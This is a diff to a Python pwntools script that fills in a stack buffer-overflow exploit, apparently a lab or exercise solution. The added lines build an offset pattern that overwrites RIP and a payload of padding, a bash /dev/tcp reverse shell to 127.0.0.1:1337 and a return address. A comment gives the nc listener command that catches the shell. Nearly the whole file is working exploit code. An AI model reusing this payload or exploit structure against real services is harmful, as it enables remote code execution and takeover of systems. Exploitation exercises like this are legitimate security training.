@@ -1,3 +1,11 @@
+#!/usr/bin/python
+#
+# it will connect to localhost:1337
+# start the reverse shell handler:
+# $ nc -l -p 1337
+
+#shellcode = 'touch /tmp/test.csnc'
+
 import time
 import struct
 import sys
@@ -29,6 +37,7 @@ continue
         io.sendafter(b"Username: ", pattern)
         io.sendafter(b"Password: ", b"password")
         io.recvall()
+        #io.wait()
         return
 
     else:
@@ -42,13 +51,17 @@ continue
         return
 
 def makePattern(offset):
-    ### ?
+    pattern = b'XXXX'
+    pattern += b'A' * (offset - 4)
+    pattern += b'BBBB' # RIP
     return pattern
 
-def makeExploit(offset, address, buf_size=128):
-    s = shellcraft.amd64.linux.bindsh(4444, "ipv4")
-    shellcode = asm(s)
-    ### ?
+def makeExploit(offset, address, buf_size=128, nop=b' '):
+    shellcode = "0<&181-;exec 181<>/dev/tcp/127.0.0.1/1337;sh <&181 >&181 2>&181"
+    exploit = nop * (buf_size - len(shellcode))
+    exploit += shellcode
+    exploit += b'A' * (offset - len(exploit))
+    exploit += p64(address)
     return exploit
 
 def checkShell():
@@ -62,3 +75,4 @@ def checkShell():
 
 if __name__ == '__main__':
         main()
+
